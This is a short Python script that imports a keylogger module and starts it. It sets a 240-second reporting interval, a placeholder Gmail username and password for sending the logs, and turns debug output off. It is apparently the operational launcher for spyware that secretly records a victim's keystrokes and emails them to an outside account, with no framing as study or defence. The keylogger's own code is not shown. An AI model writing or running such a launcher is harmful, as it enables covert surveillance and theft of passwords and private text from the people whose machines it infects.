from keylogger import Keylogger

logger = Keylogger(
	interval_seconds=240,
	gmail_username="user@gmail.com",
	gmail_pw="pass",
	debug_mode=False
)
logger.start()